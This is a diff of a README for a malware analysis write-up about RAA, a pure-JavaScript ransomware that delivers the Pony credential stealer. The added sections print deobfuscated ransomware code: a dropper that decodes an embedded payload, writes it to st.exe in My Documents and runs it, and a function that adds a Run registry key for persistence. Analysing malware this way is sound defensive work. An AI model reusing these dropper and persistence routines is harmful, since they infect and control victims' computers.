@@ -22,9 +22,12 @@ Folder **partials/** contains those parts of code (I keep order of how those fra
 - **NWvQtGjjfQX.js** contains only body of function _NWvQtGjjfQX()_, which is quite huge :)
 
 
-## How RAA JavaScript works
+# How RAA JavaScript works
 
-First executable line of script is this assingment:
+
+## The beginning
+
+First executable line of script is this assigment:
 
 ```javascript
 var TBucypWw = YUIMqkFkI();
@@ -46,6 +49,9 @@ var __key = generateKey();  // <-- returns xW5Gf
 ```
 
 This fragment just generates a string which contains five characters. In this writeup, to understand its meaning, how and where it's used, I assigned *xW5Gf* from example above as generated value of **__key** variable.
+
+
+## Here comes the Pony.
 
 Next executable fragment is:
 
@@ -126,8 +132,15 @@ WScriptShellObj.Run(run);
 ```
 ( reference: https://msdn.microsoft.com/en-us/library/d5fk67ky(v=vs.84).aspx )
 
+As a result, RTF document is displayed with some error message:
 
-Next function is ** NWvQtGjjfQX()** ,I changed its name to runRansomware():
+![RTF document]
+(extracted/extracted_rtf_screen.png)
+
+There's an information that this document can't be open in WordPAd and should be open in MS Word 2013 instead.
+
+
+Next function is **NWvQtGjjfQX()** ,I changed its name to runRansomware():
 
 ```javascript
 function runRansomware() {
@@ -142,18 +155,112 @@ function runRansomware() {
 }
 ```
 
-This function executes code, which is decrypted from **data_pn** and **cmd** with **key_cmd** key.
+This function executes code, which is decrypted from **cmd** with **key_cmd** key.
+This code contains following instructions:
+
+```javascript
+var flo = new ActiveXObject ("ADODB.Stream");
+var runer = WScript.CreateObject("WScript.Shell");
+var wher = runer.SpecialFolders("MyDocuments");
+wher = wher + "\\" + "st.exe";
+flo.CharSet = "437";
+flo.Open();
+var pny = data_pn.replace(/NMSIOP/g, "A");
+var pny_ar = CryptoJS.enc.Base64.parse(pny);
+var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
+flo.Position = 0;
+flo.SetEOS;
+flo.WriteText(pny_dec);
+flo.SaveToFile(wher, 2);
+flo.Close;
+wher = "\"" + wher + "\"";
+runer.Run(wher);
+```
+
+Again, new ActiveXObject is created, named **flo**, and Windows Script Host Shell to execute file called **st.exe**:
+
+Then, **data_pn** from **NWvQtGjjfQX()** is decrypted and new file is created "on the fly":
+
+```javascript
+var pny = data_pn.replace(/NMSIOP/g, "A");
+var pny_ar = CryptoJS.enc.Base64.parse(pny);
+var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
+```
+I saved this file in extracted/ folder as **file01**. As I found here - https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ - it contains malware called Pony (http://www.mcafee.com/threat-intelligence/malware/default.aspx?id=105468). After I found this information I've realized that its code comes from variable called **pny** (PoNY) Nice convention. :)
+
+Next, Pony is saved to file with previously created ADODB.Stream ActiveX object and executed.
+
+
+## Going forward
+
+Next function executes couple of things, eg. sets entry in Windows registry. Here's original, obfuscated source code, below is the same function with some renaming.
+
+```javascript
+function zQqUzoSxLQ() {
+    var QCY;
+    var kHkyz = WScript.CreateObject("WScript.Shell");
+    try {
+        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
+    } catch (e) {
+        QCY = 0;
+    }
+    var lCMTwJKZ = [];
+    var baZk = "wscript.exe";
+    var AFtKLHIjDtkM = 0;
+    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
+    for (; !e.atEnd(); e.moveNext()) {
+        var p = e.item();
+        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
+    }
+    lCMTwJKZ = lCMTwJKZ.split(",");
+    var jcayrm = -1;
+    do {
+        jcayrm += 1;
+        if (lCMTwJKZ[jcayrm] == baZk) {
+            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
+        } else {
+            null
+        }
+    } while (jcayrm < lCMTwJKZ.length);
+    if (AFtKLHIjDtkM < 2 && QCY == 0) {
+        var TKVUdGUkzCmE = WScript.ScriptFullName;
+        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
+        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
+        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
+        HxBG();
+    } else {
+        null;
+    }
+    return 0;
+}
+zQqUzoSxLQ();
+```
+
+
+## Summary
+
+As a web developer, I used to write JavaScript code for a little bit different purposes. AngularJS, React, Single Page Applications, Node and server side JS as well - this stuff. 
+
+But RAA confirms that JavaScript can be used for, literally, everything. Even for creating the worst nightmare of each user, which is IMHO Ransomware
 
 
 
 ## Links, references
 
 
-**SophosLabs blog**			
-https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/
+Source code of RAA:
 
 **malwr.com**
 https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/
+
+
+Sophos blog post about RAA:
+
+**SophosLabs blog**			
+https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/
+
+
+Very detailed analysis of RAA, by ReaQta:
 
 **RAA – An entirely new JS ransomware delivering Pony malware**
 https://reaqta.com/2016/06/raa-ransomware-delivering-pony/
